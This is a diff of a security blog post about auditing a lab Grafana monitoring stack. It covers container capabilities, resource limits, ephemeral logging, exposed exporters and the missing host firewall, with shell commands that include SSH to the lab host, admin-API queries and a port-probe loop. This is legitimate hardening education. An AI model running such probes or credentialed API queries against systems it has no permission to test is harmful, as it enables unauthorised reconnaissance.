+**The goal:** We're going to prove that the Grafana container runs with the full default set of Linux capabilities — it can change file ownership, bind to privileged ports, manipulate raw network sockets, override file access controls, and more. None of which it needs to serve dashboards. We're also checking that `no-new-privileges` isn't set, which means a process inside the container could escalate its privileges.
+
+**What we're trying to break:** We inspect the container's capability configuration (`CapDrop`, `CapAdd`, `SecurityOpt`) and show that nothing is restricted. The effective capabilities bitmask from `/proc/1/status` reveals everything the container is allowed to do. This is the starting point for the container hardening we do in Part 2 — you can't drop capabilities you don't know are there.
+
+**API Reference:**
+- Docker Engine Security: https://docs.docker.com/engine/security/
+- Docker Seccomp Profiles: https://docs.docker.com/engine/security/seccomp/
+- CIS Docker Benchmark: https://www.cisecurity.org/benchmark/docker
+- Linux Capabilities: https://man7.org/linux/man-pages/man7/capabilities.7.html
+
+#### PROVE IT
+
+**Auditor Access Required** — Container security posture cannot be verified remotely via API. These checks require SSH + Docker CLI access, representing an internal security audit rather than an external attack.
 
 ```bash
-sudo docker volume ls --format '{{.Name}}' | grep monitoring
-monitoring_grafana-storage
-monitoring_prometheus-storage
+# SSH to Grafana-lab (auditor access)
+ssh oob@192.168.75.109
+
+echo "=== VULN-09: No Container Hardening ==="
+
+# Check capability drops
+echo "--- Capabilities ---"
+echo -n "  CapDrop: "
+docker inspect grafana --format='{{json .HostConfig.CapDrop}}'
+# EXPECTED: null or [] (nothing dropped)
+
+echo -n "  CapAdd: "
+docker inspect grafana --format='{{json .HostConfig.CapAdd}}'
+# EXPECTED: null or [] (nothing explicitly added, but ALL are inherited)
+
+# Check security options
+echo ""
+echo "--- Security Options ---"
+echo -n "  SecurityOpt: "
+docker inspect grafana --format='{{json .HostConfig.SecurityOpt}}'
+# EXPECTED: null or [] (no-new-privileges NOT set)
+
+# Check privileged mode
+echo ""
+echo -n "  Privileged: "
+docker inspect grafana --format='{{.HostConfig.Privileged}}'
+# EXPECTED: false (but caps still unrestricted)
+
+# Full capability list the container inherits
+echo ""
+echo "--- Effective Capabilities ---"
+docker exec grafana cat /proc/1/status 2>/dev/null | grep "Cap"
+# Shows the bitmask of ALL inherited capabilities
 ```
 
-Two Docker volumes. Roughly 262MB total -- Grafana's dashboards, users, and preferences (~50MB) plus Prometheus's time-series history (~212MB). Every dashboard someone spent hours building. Every alerting rule. Every user account and permission. All of it living on a single disk with no redundancy (remember VULN-03: one 32GB ext4 partition, no RAID).
-
-A disk failure destroys everything. A bad `docker-compose down -v` destroys everything. An accidental `docker volume prune` during routine cleanup destroys everything. And there's no path back.
-
-**Compliance impact:** NIST CP-9 (Information System Backup), CP-10 (Information System Recovery), SOC 2 A1.2.
+**Why this can't be done from jump box:** Grafana's HTTP API does not expose Docker container configuration. Container security posture (capabilities, security options, resource limits) is only visible through the Docker daemon API, which requires host-level access. This is also why many organizations miss these issues — they're invisible to network-based scanners.
 
 ---
 
-## Assessment Summary
+### VULN-11: No Resource Limits
 
-Fifteen vulnerabilities across a five-container monitoring stack, assessed in 90 minutes with 98 commands. Of those, 72 produced successful findings, 20 were failed attempts or troubleshooting detours, and 6 were duplicate paste errors from clipboard issues during the session. Thirty-four commands ran from the jump box (external attacker), sixty-four from Grafana-lab (post-compromise). One backdoor was created and cleaned up. The severity distribution:
+**Severity:** Medium | **CVSS:** 4.0
 
-| Severity | Count | Vulnerabilities |
-|---|---|---|
-| CRITICAL | 4 | VULN-01 (Prometheus unauth), VULN-02 (cAdvisor inventory), VULN-03 (Node Exporter metrics), VULN-04 (Blackbox SSRF) |
-| HIGH | 4 | VULN-05 (OAuth secret plaintext), VULN-06 (Session persistence), VULN-07 (No brute-force protection), VULN-08 (Plaintext OAuth) |
-| MEDIUM | 4 | VULN-09 (Missing headers), VULN-10 (Zero TLS), VULN-11 (Container capabilities), VULN-12 (Flat network) |
-| LOW | 3 | VULN-13 (OAuth auto sign-up), VULN-14 (No audit logging), VULN-15 (No backups) |
+**Compliance Violations:** CIS Docker Benchmark 5.10/5.11
 
-The four criticals share a root cause that should make every monitoring team uncomfortable: the default configuration. Prometheus, Node Exporter, cAdvisor, and Blackbox Exporter all ship with zero access controls. No authentication. No authorization. Not even a config option you forgot to enable -- the concept doesn't exist in the default deployment. The vendors ship them this way. Most production environments leave them this way. And most security teams never test them because monitoring infrastructure is "internal."
+**The goal:** We're going to prove that the Grafana container has no CPU or memory limits. Zero. It can consume every byte of RAM and every CPU cycle on the host. This is a denial-of-service risk — whether it's a legitimate memory leak, a runaway query, or an attacker intentionally flooding the service. Without cgroup constraints, one misbehaving container can starve everything else on the host.
 
-The four highs are all configuration decisions masquerading as architecture problems. OAuth secrets in plaintext, sessions that outlive the employees who created them, a login endpoint that accepts 54 guesses per second, token exchanges flying across the network in cleartext. Not one of these requires a code change or a version upgrade to fix.
+**What we're trying to break:** We inspect Memory, NanoCpus, MemorySwap, and PidsLimit — all should be 0 (unlimited). Then we show the current resource usage with `docker stats` to drive the point home: Grafana has access to 100% of the host's resources.
 
-The mediums are the hardening work that everyone knows they should do and almost nobody actually does: security headers, TLS, container capabilities, network segmentation. It's not exciting work. It stays on the backlog until something goes wrong.
+**API Reference:**
+- Docker resource constraints: https://docs.docker.com/engine/containers/resource_constraints/
+- Docker Compose deploy: https://docs.docker.com/compose/compose-file/deploy/#resources
 
-The lows are the operational gaps that turn a bad day into a catastrophe: auto-provisioning controls nobody reviewed, logs that lie about who attacked you, and zero recovery path when the disk dies.
+#### PROVE IT
 
----
+**Auditor Access Required** — Resource limits are Docker daemon configuration, not visible via Grafana API.
 
-## Compliance Framework Cross-Reference
+```bash
+# SSH to Grafana-lab (auditor access)
+ssh oob@192.168.75.109
 
-Every vulnerability maps to specific controls across five frameworks. The table below provides the full mapping -- brief references appeared inline with each finding above.
+echo "=== VULN-11: No Resource Limits ==="
 
-### NIST 800-53 Rev 5
+echo -n "  Memory limit: "
+MEM=$(docker inspect grafana --format='{{.HostConfig.Memory}}')
+[ "$MEM" = "0" ] && echo "UNLIMITED (0)" || echo "Limited: $MEM"
 
-| Control | Description | Vulnerabilities |
-|---|---|---|
-| AC-2 | Account Management | VULN-13 |
-| AC-2(3) | Disable Accounts on Termination | VULN-06 |
-| AC-3 | Access Enforcement | VULN-01, VULN-02 |
-| AC-4 | Information Flow Enforcement | VULN-04 |
-| AC-7 | Unsuccessful Logon Attempts | VULN-07 |
-| AC-12 | Session Termination | VULN-06 |
-| AU-2 | Audit Events | VULN-14 |
-| AU-3 | Content of Audit Records | VULN-14 |
-| CM-7 | Least Functionality | VULN-01, VULN-02, VULN-03, VULN-11 |
-| CP-9 | Information System Backup | VULN-15 |
-| CP-10 | Information System Recovery | VULN-15 |
-| IA-5 | Authenticator Management | VULN-05, VULN-07 |
-| SC-6 | Resource Availability | VULN-11 |
-| SC-7 | Boundary Protection | VULN-04, VULN-12 |
-| SC-8 | Transmission Confidentiality | VULN-08, VULN-09, VULN-10 |
-| SC-23 | Session Authenticity | VULN-08 |
-| SC-28 | Protection of Information at Rest | VULN-05 |
+echo -n "  CPU limit: "
+CPU=$(docker inspect grafana --format='{{.HostConfig.NanoCpus}}')
+[ "$CPU" = "0" ] && echo "UNLIMITED (0)" || echo "Limited: $CPU"
 
-### SOC 2
+echo -n "  Memory swap: "
+docker inspect grafana --format='{{.HostConfig.MemorySwap}}'
+# EXPECTED: 0 (unlimited)
 
-| Criteria | Description | Vulnerabilities |
-|---|---|---|
-| CC6.1 | Logical Access Controls | VULN-01, VULN-02, VULN-05, VULN-06, VULN-07 |
-| CC6.3 | Security for Access Removal | VULN-06 |
-| CC6.6 | Security for External Threats | VULN-04 |
-| CC6.7 | Transmission Protection | VULN-08, VULN-10 |
-| CC7.2 | System Monitoring | VULN-14 |
-| A1.2 | Recovery Procedures | VULN-15 |
+echo -n "  PID limit: "
+docker inspect grafana --format='{{.HostConfig.PidsLimit}}'
+# EXPECTED: 0 or -1 (unlimited)
+```
 
-### CIS Controls v8
+**What you should see:** Memory: 0, CPU: 0 — completely unlimited. A single container can consume all host resources. Like VULN-09, this is invisible to network scanners.
 
-| Safeguard | Description | Vulnerabilities |
-|---|---|---|
-| 4.1 | Secure Configuration | VULN-01, VULN-03 |
-| 6.2 | Establish Access Revoking Process | VULN-06 |
-| 13.4 | Network-Level Access Control | VULN-04 |
-| 16.8 | Browser Security Controls | VULN-09 |
+#### BREAK IT
 
-### CIS Docker Benchmark
+```bash
+# Still on Grafana-lab (auditor access)
 
-| Recommendation | Description | Vulnerabilities |
-|---|---|---|
-| 4.10 | Secrets Not Stored in Dockerfiles | VULN-05 |
-| 5.3/5.4 | Kernel Capabilities Restricted | VULN-02, VULN-11 |
-| 5.10 | Memory Usage Limited | VULN-11 |
-| 5.13 | Incoming Traffic Bound to Specific Interface | VULN-01 |
-| 5.26 | Cannot Acquire Additional Privileges | VULN-11 |
-| 5.30 | Default Bridge Not Used | VULN-12 |
+# Without resource limits, a single rogue process can DoS the entire host
+echo "Host total memory:"
+free -h | grep Mem
 
-### PCI-DSS v4.0
-
-While this monitoring stack doesn't directly process cardholder data, PCI-DSS applies to all system components in or connected to the cardholder data environment. Monitoring infrastructure that observes systems within CDE scope inherits these requirements.
-
-| Sub-Requirement | Description | Vulnerabilities |
-|---|---|---|
-| 1.2.1 | NSC ruleset configuration standards | VULN-04, VULN-12 |
-| 1.3.1 | Inbound traffic restricted to necessary | VULN-01, VULN-02, VULN-03 |
-| 1.3.2 | Outbound traffic restricted to necessary | VULN-04 |
-| 1.4.1 | NSCs between trusted/untrusted networks | VULN-12 |
-| 2.2.1 | Secure configuration standards maintained | VULN-01, VULN-02, VULN-03, VULN-11 |
-| 2.2.2 | Vendor default accounts managed | VULN-07 |
-| 2.2.5 | Unnecessary services removed | VULN-02, VULN-03 |
-| 2.2.7 | Non-console admin access encrypted | VULN-10, VULN-08 |
-| 4.2.1 | Strong cryptography during transmission | VULN-10, VULN-08 |
-| 4.2.1.1 | Trusted key/certificate inventory | VULN-10 |
-| 7.2.1 | Access control model defined | VULN-01, VULN-02, VULN-03 |
-| 7.2.2 | Access assigned by job function | VULN-13 |
-| 7.2.5 | Application/system account access reviewed | VULN-06 |
-| 8.3.4 | Invalid auth attempts limited (max 10) | VULN-07 |
-| 8.3.6 | Password complexity enforced | VULN-07 |
-| 8.4.2 | MFA for CDE access | VULN-07 |
-| 8.6.1 | System/application account management for interactive login | VULN-05 |
-| 8.6.2 | Passwords not in scripts/config files | VULN-05 |
-| 10.2.1 | Audit logs enabled and active | VULN-14 |
-| 10.2.1.2 | Admin actions captured in logs | VULN-14 |
-| 10.2.2 | Audit logs record required fields | VULN-14 |
-| 10.3.1 | Audit log access restricted | VULN-14 |
-| 10.3.3 | Logs backed up to central server | VULN-14 |
-| 10.5.1 | 12-month log retention | VULN-14 |
-| 12.10.1 | Incident response plan exists | VULN-15 |
+echo ""
+echo "Grafana can allocate ALL of it — no cgroup constraints:"
+docker stats grafana --no-stream --format "table {{.MemUsage}}\t{{.MemPerc}}\t{{.CPUPerc}}"
+```
 
 ---
 
-## What Comes Next
+## Phase 6: Enhanced Security (Cert Renewal, Audit Logging, Network Hardening)
 
-Every vulnerability documented here has a concrete remediation. The companion post walks through the phased implementation -- session hardening, HAProxy TLS termination with rate limiting, Prometheus authentication, Docker network segmentation, container capability dropping, audit logging configuration, and backup procedures. Six phases, progressively raising the security score from 6.0 to 9.8 out of 10.
+**Time:** ~1 hour | **Score:** 9.5 to 9.8 (+0.3)
 
-A note on the security score: the 6.0-9.8 scoring is a weighted methodology developed for this series based on the severity and count of open findings. It is not an industry-standard benchmark or certification metric -- it's a narrative device to track remediation progress across phases.
+**Vulnerabilities Addressed:** VULN-12 (network), VULN-14 (logging), plus operational improvements
 
-OpenBAO integration -- PKI certificate automation, runtime secret injection via AppRole, and token provisioning -- gets its own dedicated series. It's a substantial deployment with its own architecture decisions and failure modes.
-
-The tools in this stack aren't broken. They're working exactly as designed. That's the problem. Prometheus, cAdvisor, Node Exporter, and Blackbox Exporter all ship without authentication because they assume you'll deploy them behind something that provides it. A reverse proxy. A firewall rule. A VPN. Something.
-
-Most environments don't. The monitoring stack gets deployed during a sprint, it works, dashboards light up, and everyone moves on to the next ticket. Nobody comes back to harden it because it's "just monitoring" and it's "only internal." Fifteen vulnerabilities later, "just monitoring" has given an attacker the complete infrastructure topology, cross-VLAN access, persistent admin credentials, and a clear map of everything worth hitting next.
-
-The gap between "assumed secure because it's internal" and "actually secured" is where every one of these findings lives.
+The final phase covers the operational security gaps — the things that don't make for dramatic exploitation demos but absolutely matter when something goes wrong. Missing audit logs mean no forensics after an incident. Exposed exporter ports mean your network hardening from Phase 3 has holes. And no host firewall means you're one docker-compose typo away from re-exposing everything.
 
 ---
 
-## References and Resources
+### VULN-14: Ephemeral Console-Only Logging
 
-**OWASP Testing Guide v4.2** -- The brute-force testing methodology (VULN-07), session management validation (VULN-06), and SSRF identification (VULN-04) follow OWASP's Web Security Testing Guide, specifically WSTG-ATHN-03 (Testing for Weak Lock Out Mechanism), WSTG-SESS-01 (Testing for Session Management Schema), and WSTG-INPV-19 (Testing for Server-Side Request Forgery).
+**Severity:** Medium | **CVSS:** 4.0
 
-**Prometheus Documentation** -- Default configuration behavior, API endpoints (`/api/v1/targets`, `/api/v1/status/config`), and the absence of built-in authentication are documented in the Prometheus Security Model and HTTP API reference.
+**Compliance Violations:** NIST AU-2, NIST AU-4, SOC 2 CC7.2, CIS 8.2
 
-**cAdvisor API Documentation** -- Container and machine API endpoints (`/api/v1.0/machine`, `/api/v1.0/containers/`) referenced in Google's cAdvisor repository. The systemd slice path discovery (VULN-02) was determined through experimentation when the documented `/docker` endpoint didn't work.
+**The goal:** We're going to prove that Grafana's logs are completely ephemeral — they go to stdout, they're in unstructured plaintext, and they disappear the moment the container restarts. If an attacker compromises Grafana, creates a backdoor (like we showed in VULN-06 and VULN-07), and the container gets restarted for any reason, the evidence is gone. No audit trail, no forensic data, nothing to investigate.
 
-**Grafana Administration API** -- Service account creation, token generation, admin settings retrieval, and session configuration documented in the Grafana HTTP API reference. The deprecated `/api/auth/keys` endpoint behavior was confirmed through testing against Grafana v12.
+**What we're trying to break:** We check the log configuration via the admin API (which helpfully tells us everything is default), then SSH in to prove the logs aren't persistent, aren't in a structured format, and are lost on restart. This is the kind of finding that doesn't look dramatic, but it's the first thing an incident response team asks for — and if you don't have it, you're flying blind.
 
-**Node Exporter** -- Metrics exposure and host-level data collection documented in the Prometheus Node Exporter repository.
+**API Reference:**
+- Grafana Logging config: https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#log
+- Docker logging drivers: https://docs.docker.com/engine/logging/
 
-**Blackbox Exporter** -- Probe endpoint behavior and module configuration documented in the Prometheus Blackbox Exporter repository. SSRF potential through unauthenticated probe endpoints is discussed in multiple security advisories and monitoring security guides.
+#### PROVE IT
 
-**CIS Docker Benchmark v1.6** -- Container capability assessment, network segmentation checks, and secret storage validation (VULNs 05, 11, 12) follow the CIS Docker Benchmark. Specific recommendations referenced: 4.10, 5.3, 5.4, 5.10, 5.13, 5.26, 5.30.
+```bash
+# From jump box — check log configuration via admin API
+GRAFANA="192.168.75.109"
+ADMIN_CREDS="admin:$ADMIN_PASSWORD"    # See Password Convention section
 
-**NIST SP 800-53 Rev 5** -- Control mapping throughout the assessment references NIST Special Publication 800-53 Revision 5, Security and Privacy Controls for Information Systems and Organizations.
+echo "=== VULN-14: Ephemeral Logging ==="
 
-**OWASP Secure Headers Project** -- Security header assessment (VULN-09) references the OWASP Secure Headers Project for expected headers and their security implications.
+# Step 1: Admin API exposes log configuration
+echo "--- Log configuration via API (from jump box) ---"
+curl -s -u $ADMIN_CREDS http://$GRAFANA:3000/api/admin/settings | \
+  python3 -c "
+import sys,json
+data = json.load(sys.stdin)
+log = data.get('log', {})
+for k,v in log.items():
+    print(f'  {k}: {v}')
+if not log:
+    print('  NO LOG CONFIGURATION (using defaults = console only)')
+"
+# EXPECTED: Default config — console mode, no file output, no structured format
+```
 
-**Docker Documentation** -- Container inspection, network listing, capability management, and volume commands referenced from Docker CLI documentation. The `docker inspect` format strings for extracting security-relevant configuration follow Docker's Go template syntax.
+**For deeper audit (requires SSH access to Grafana-lab):**
 
-**PCI-DSS v4.0** -- Payment Card Industry Data Security Standard version 4.0, published by the PCI Security Standards Council. Applied to monitoring infrastructure under the scope extension for system components connected to the cardholder data environment.
+```bash
+# SSH to Grafana-lab for container-level verification
+ssh oob@192.168.75.109
 
-**SOC 2 Trust Services Criteria** -- AICPA Trust Services Criteria for Security, Availability, and Confidentiality, used for compliance mapping throughout.
+# Check current log environment variables
+echo "--- Log env vars ---"
+docker exec grafana env | grep -i "GF_LOG"
+# EXPECTED: No output — default console-only logging
+
+# Logs disappear on container restart
+echo ""
+echo "--- Log persistence test ---"
+docker restart grafana
+sleep 5
+LOG_LINES=$(docker logs grafana 2>&1 | wc -l)
+echo "  Lines after restart: $LOG_LINES (previous session logs are GONE)"
+
+# No structured format for SIEM ingestion
+echo ""
+echo "--- Log format (unstructured text) ---"
+docker logs grafana 2>&1 | tail -3
+# EXPECTED: Plain text, not JSON — unparseable by log aggregators
+```
+
+**What you should see:** No log configuration in the API, console-only output, logs lost on restart, unstructured text format. No audit trail, no forensics capability.
 
 ---
 
-*Published by Oob Skulden™ -- Stay Paranoid.*
+### VULN-02/03/04: Exporter Network Exposure (Remaining)
+
+**The goal:** Even after Phase 3 locks down Prometheus with auth and localhost binding, the underlying exporters (Node Exporter, cAdvisor, Blackbox) are still directly accessible on their own ports. This is a common oversight — people secure the query layer (Prometheus) but forget that the data sources are still exposed. We're proving that the partial fix from Phase 3 isn't complete.
+
+#### PROVE IT
+
+```bash
+# From jump box — all exporters still reachable from the network
+GRAFANA="192.168.75.109"
+
+echo "=== VULN-02/03/04: Exporters Still Network Accessible ==="
+echo "Running from: $(hostname) / $(hostname -I | awk '{print $1}')"
+
+# Node Exporter — accessible from jump box
+echo -n "  Node Exporter (9100): "
+curl -s -o /dev/null -w "%{http_code}" http://$GRAFANA:9100/metrics
+echo " (200 = still exposed to network)"
+
+# cAdvisor — accessible from jump box
+echo -n "  cAdvisor (8080): "
+curl -s -o /dev/null -w "%{http_code}" http://$GRAFANA:8080/metrics
+echo " (200 = still exposed to network)"
+
+# Blackbox — accessible from jump box (SSRF vector still open)
+echo -n "  Blackbox (9115): "
+curl -s -o /dev/null -w "%{http_code}" http://$GRAFANA:9115/metrics
+echo " (200 = SSRF vector still open)"
+```
+
+**What you should see from jump box:** All three return 200. Despite Prometheus auth in Phase 3, the underlying exporters are still directly accessible from the network. Phase 6.3 binds them to localhost, and Phase 6.4 adds host firewall rules as a second independent layer.
+
+---
+
+### No Host Firewall (Addressed in Phase 6.4)
+
+**Severity:** Medium | **CVSS:** 4.0
+
+**Compliance Violations:** NIST SC-7, CIS 4.4
+
+**The goal:** We're going to prove that there's no host-level firewall running on the Grafana host. This matters because localhost binding (Phase 6.3) is a Docker-level control — it's one layer. If someone edits docker-compose.yml and accidentally removes the `127.0.0.1:` prefix from a port mapping, that port is immediately exposed to the network with zero fallback protection. A host firewall at the kernel level provides a second, independent control. CIS 4.4 specifically requires a host-based firewall — localhost binding alone doesn't satisfy it.
+
+**What we're trying to break:** We port scan the host from the jump box to show that everything Docker exposes is reachable, then verify via SSH that ufw is inactive and iptables has no custom rules. The point is to demonstrate that there's a single point of failure for network access control.
+
+**API Reference:**
+- ufw manual: https://manpages.debian.org/bookworm/ufw/ufw.8.en.html
+- CIS Benchmark for Debian: https://www.cisecurity.org/benchmark/debian_linux
+
+#### PROVE IT
+
+```bash
+# From jump box — prove there's no host firewall on Grafana-lab
+GRAFANA="192.168.75.109"
+
+echo "=== No Host Firewall ==="
+
+# Step 1: Port scan the monitoring host — everything that Docker exposes is reachable
+# Even if Docker binds to 127.0.0.1, there's no kernel-level deny to back it up
+echo "--- Port scan from jump box (no firewall = nothing blocked at kernel level) ---"
+for PORT in 22 80 443 3000 8080 9090 9100 9115; do
+  RESULT=$(curl -s --connect-timeout 2 -o /dev/null -w "%{http_code}" http://$GRAFANA:$PORT 2>/dev/null)
+  echo "  Port $PORT: $RESULT"
+done
+# NOTE: On the vanilla baseline, ports 3000/8080/9090/9100/9115 all respond
+# After Phase 6.3 localhost binding, they'll show connection refused
+# But WITHOUT a firewall, there's only ONE layer protecting them (Docker binding)
+# If someone edits docker-compose.yml and removes the 127.0.0.1 prefix, the port is wide open
+
+# Step 2: Verify no firewall is running on the host
+# This requires SSH access (auditor access) to confirm
+echo ""
+echo "--- Firewall Status (requires SSH to Grafana-lab) ---"
+echo "  Run on Grafana-lab: sudo ufw status"
+echo "  Expected: Status: inactive (no firewall configured)"
+echo "  Run on Grafana-lab: sudo iptables -L -n"
+echo "  Expected: All chains ACCEPT (no rules)"
+```
+
+**For auditor verification (requires SSH to Grafana-lab):**
+
+```bash
+# SSH to Grafana-lab
+ssh oob@192.168.75.109
+
+echo "=== Host Firewall Status ==="
+echo -n "  ufw status: "
+sudo ufw status 2>/dev/null || echo "ufw not installed"
+# Expected: Status: inactive
+
+echo -n "  iptables rules: "
+sudo iptables -L -n 2>/dev/null | grep -c "ACCEPT\|DROP\|REJECT"
+# Expected: 0 custom rules (only default ACCEPT policies)
+
+echo -n "  nftables rules: "
+sudo nft list ruleset 2>/dev/null | grep -c "rule"
+# Expected: 0 or minimal default rules
+```
+
+**Why this matters:** Localhost binding is a Docker-level control. If a compose file edit accidentally removes the `127.0.0.1:` prefix, the port immediately becomes network-accessible. A host firewall at the kernel level provides a second independent control — both must fail simultaneously for the port to be exposed. CIS 4.4 specifically requires a host-based firewall on servers; localhost binding alone does not satisfy this control.
+
+---
+
+## Security Score Progression
+
+| Phase | Score | Improvement | VULNs Addressed |
+|-------|-------|-------------|-----------------|
+| Baseline | 6.0/10 | – | – |
+| Phase 1 | 7.5/10 | +1.5 | VULN-05, VULN-06 |
+| Phase 2 | 8.0/10 | +0.5 | VULN-07, VULN-10 |
+| Phase 3 | 8.5/10 | +0.5 | VULN-02, VULN-03 (partial), VULN-04 (partial) |
+| Phase 4 | 9.0/10 | +0.5 | VULN-05 (deep validation) |
+| Phase 5 | 9.5/10 | +0.5 | VULN-09, VULN-11 |
+| Phase 6 | 9.8/10 | +0.3 | VULN-12, VULN-14, Host Firewall |
+
+---
+
+*Published by Oob Skulden™ — Every command traces to official vendor documentation. No obscure exploits — just reading the docs and using the APIs as designed, without authorization. Stay paranoid.*
